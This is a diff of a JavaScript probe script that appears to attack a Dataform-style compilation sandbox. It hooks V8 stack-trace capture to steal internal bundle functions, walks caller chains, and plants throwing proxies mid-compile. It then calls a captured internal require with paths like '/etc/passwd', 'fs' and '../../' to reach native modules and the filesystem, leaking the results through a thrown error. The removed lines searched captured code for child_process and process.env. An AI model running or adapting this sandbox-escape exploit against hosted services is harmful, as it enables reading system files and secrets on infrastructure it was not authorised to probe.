@@ -1,4 +1,4 @@
-// v11 — trigger deep bundle errors to capture inner bundle functions
+// v12 — walk caller chain via Function.caller; introspect captured functions deeply
 
 var out = {};
 function safe(k, fn) {
@@ -7,9 +7,8 @@ function safe(k, fn) {
 }
 
 globalThis.__capt = {};
-Error.stackTraceLimit = 100;
+Error.stackTraceLimit = Infinity;
 
-// Global hook — capture EVERY function reference from EVERY stack trace
 Error.prepareStackTrace = function(err, callSites) {
   try {
     for (var i = 0; i < callSites.length; i++) {
@@ -17,14 +16,10 @@ Error.prepareStackTrace = function(err, callSites) {
       try {
         var fn = cs.getFunction && cs.getFunction();
         if (!fn || typeof fn !== 'function') continue;
-        var fileName = (cs.getFileName && cs.getFileName()) || '?';
-        var fnName = (cs.getFunctionName && cs.getFunctionName()) ||
-                     (cs.getMethodName && cs.getMethodName()) || '?';
         var src = String(fn);
-        // Key by source hash so duplicates by name don't overwrite each other
-        var key = fileName + ':' + fnName + ':' + src.length;
+        var key = (cs.getFileName && cs.getFileName() || '?') + ':' + (cs.getFunctionName && cs.getFunctionName() || '?') + ':' + src.length;
         if (!globalThis.__capt[key]) {
-          globalThis.__capt[key] = { src: src, fn: fn, fileName: fileName, fnName: fnName };
+          globalThis.__capt[key] = { src: src, fn: fn };
         }
       } catch(e) {}
     }
@@ -32,99 +27,107 @@ Error.prepareStackTrace = function(err, callSites) {
   return '';
 };
 
-// ============ Trigger deep errors ============
-safe('A_simple_throw', function() {
-  try { throw new Error('x'); } catch(e) { e.stack; }
-  return Object.keys(globalThis.__capt).length;
+// ============ Trigger multiple ERROR creation points ============
+safe('A', function() {
+  // Create error AT TIME of each interesting bundle function call
+  // 1. Inside publish() — pre-error
+  try { var p = publish('t1', { type: 'view' }); p.query('SELECT 1'); } catch(e) { e.stack; }
+  // 2. Force a compile error
+  try { global._DF_SESSION.compile(); } catch(e) { e.stack; }
+  // 3. Notebook with valid filename
+  // 4. resolve() with non-existent
+  try { global._DF_SESSION.resolve({name:'no_exist', schema:'a', database:'b'}); } catch(e) { e.stack; }
+  // 5. compileError directly
+  try { global._DF_SESSION.compileError(new Error('forced'), null); } catch(e) { e.stack; }
+  // 6. assertion
+  try { assert('test_assertion', 'SELECT 1'); } catch(e) { e.stack; }
+  // 7. operate
+  try { operate('test_op', 'CREATE TABLE x AS SELECT 1'); } catch(e) { e.stack; }
+  // 8. declare
+  try { declare({name: 'test_decl', schema: 'a'}); } catch(e) { e.stack; }
+  return 'fns_count=' + Object.keys(globalThis.__capt).length;
 });
 
-// Force error DEEP in compile path — mess with action's compile method
-safe('B_inject_throw_in_action', function() {
-  try {
-    var p = publish('deeperr', { type: 'view' });
-    p.query('SELECT 1'); // make it valid
-    // Now mess with its compile so when session.compile() reaches it, it throws
-    p.compile = function() { throw new Error('DEEP_FROM_ACTION_COMPILE'); };
-    // Force session compile
+// Force errors via mid-compile injection
+safe('B_throw_mid_compile', function() {
+  // Create a Proxy that throws on property access — install in actions
+  var trapProxy = new Proxy({}, {
+    get: function(t, p) { throw new Error('TRAP_' + String(p)); },
+    set: function(t, p, v) { throw new Error('TRAP_SET_' + String(p)); }
+  });
+  // Replace one action's proto with the proxy
+  if (global._DF_SESSION.actions && global._DF_SESSION.actions.length > 0) {
+    var a = global._DF_SESSION.actions[0];
+    var origProto = a.proto;
+    Object.defineProperty(a, 'proto', { get: function() { throw new Error('PROTO_TRAP_DEEP'); } });
     try { global._DF_SESSION.compile(); } catch(e) { e.stack; }
-    return 'compiled, captures=' + Object.keys(globalThis.__capt).length;
-  } catch(e) { return 'err:' + e.message + ' captures=' + Object.keys(globalThis.__capt).length; }
+    // restore
+    Object.defineProperty(a, 'proto', { value: origProto, writable: true, configurable: true });
+  }
+  return 'fns_count=' + Object.keys(globalThis.__capt).length;
 });
 
-// Force error from deep proto verify
-safe('C_force_proto_verify_error', function() {
-  try {
-    var p2 = publish('verifytest', { type: 'view' });
-    p2.query('SELECT 1');
-    // Inject a property that fails verifyObjectMatchesProto
-    p2.proto.unexpected_field_to_trigger_throw = 'attacker';
-    try { global._DF_SESSION.compile(); } catch(e) { e.stack; }
-    return 'captures=' + Object.keys(globalThis.__capt).length;
-  } catch(e) { return 'err:' + e.message; }
-});
-
-// Force resolve error
-safe('D_force_resolve_error', function() {
-  try { global._DF_SESSION.resolve({name: 'does_not_exist', schema: 'x', database: 'y'}); } catch(e) { e.stack; }
-  try {
-    // resolveTarget?
-    var sql = global._DF_SESSION.compilationSql();
-    return 'sql_keys=' + Object.keys(sql).join(',') + ' captures=' + Object.keys(globalThis.__capt).length;
-  } catch(e) { return 'err:' + e.message + ' captures=' + Object.keys(globalThis.__capt).length; }
-});
-
-// ============ Search captures ============
-safe('E_search_native_refs', function() {
+// ============ Walk caller chain on captured functions ============
+safe('C_walk_caller_chain', function() {
   var results = [];
   for (var k in globalThis.__capt) {
-    var f = globalThis.__capt[k];
-    var s = f.src;
-    if (s.indexOf('inquire') >= 0 ||
-        s.indexOf('nativeRequire') >= 0 ||
-        s.indexOf('eval("quire"') >= 0 ||
-        s.indexOf('eval(\'quire\'') >= 0 ||
-        s.indexOf('child_process') >= 0 ||
-        s.indexOf('require(\'fs\')') >= 0 ||
-        s.indexOf('process.env') >= 0) {
-      results.push({ k, src_preview: s.substring(0, 400) });
+    var fn = globalThis.__capt[k].fn;
+    if (!fn) continue;
+    try {
+      var caller = fn.caller;
+      if (caller && typeof caller === 'function') {
+        results.push({k, caller_src: String(caller).substring(0, 200)});
+      }
+    } catch(e) {
+      results.push({k, err: e.message.substring(0,80)});
     }
   }
   return JSON.stringify(results);
 });
 
-safe('F_all_captured_files', function() {
-  var files = {};
+safe('D_walk_arguments', function() {
+  var results = [];
   for (var k in globalThis.__capt) {
-    var f = globalThis.__capt[k];
-    files[f.fileName] = (files[f.fileName] || 0) + 1;
-  }
-  return JSON.stringify(files);
-});
-
-safe('G_sample_names_per_file', function() {
-  var fileMap = {};
-  for (var k in globalThis.__capt) {
-    var f = globalThis.__capt[k];
-    if (!fileMap[f.fileName]) fileMap[f.fileName] = [];
-    if (fileMap[f.fileName].length < 5) fileMap[f.fileName].push(f.fnName);
-  }
-  return JSON.stringify(fileMap);
-});
-
-safe('H_full_sources_of_interest', function() {
-  // Dump full sources of ALL captured functions from bundle (not from our eval_test.js)
-  var bundle_fns = [];
-  for (var k in globalThis.__capt) {
-    var f = globalThis.__capt[k];
-    if (f.fileName && f.fileName.indexOf('eval_test') < 0 && f.fileName !== '?') {
-      bundle_fns.push({ k, src: f.src.substring(0, 800) });
+    var fn = globalThis.__capt[k].fn;
+    if (!fn) continue;
+    try {
+      var args = fn.arguments;
+      results.push({k, has_args: args !== undefined ? args.length : 'none'});
+    } catch(e) {
+      results.push({k, err: e.message.substring(0,80)});
     }
   }
-  return JSON.stringify(bundle_fns.slice(0, 20));
+  return JSON.stringify(results);
 });
 
-// Restore
+// ============ List all captured WITH their FULL src ============
+safe('E_dump_all', function() {
+  var summary = [];
+  for (var k in globalThis.__capt) {
+    summary.push({k, src_first_400: globalThis.__capt[k].src.substring(0, 400)});
+  }
+  return JSON.stringify(summary);
+});
+
+// ============ NEW ANGLE: bind a captured function with our `this` and see what changes ============
+safe('F_bind_invoke', function() {
+  // Try calling 'g' (require_bin) with crafted paths that might leak info
+  for (var k in globalThis.__capt) {
+    if (k.indexOf('require_bin.js:g') >= 0) {
+      var g = globalThis.__capt[k].fn;
+      // Try absolute paths
+      var attempts = {};
+      for (var p of ['/etc/passwd', 'protobufjs', 'protobufjs/minimal', 'protobufjs/inquire', 'fs', '@dataform/core', '../node_modules/.../', 'node_modules', '../../']) {
+        try { attempts[p] = 'GOT keys=' + Object.keys(g(p) || {}).slice(0,5).join(','); }
+        catch(e) { attempts[p] = 'err:' + e.message.substring(0,60); }
+      }
+      return JSON.stringify(attempts);
+    }
+  }
+  return 'no g captured';
+});
+
 Error.prepareStackTrace = undefined;
 
 module.exports.asJson = { cells: [], metadata: {}, nbformat: 4, nbformat_minor: 5 };
-throw new Error('PROBE_v11:' + JSON.stringify(out));
+throw new Error('PROBE_v12:' + JSON.stringify(out));
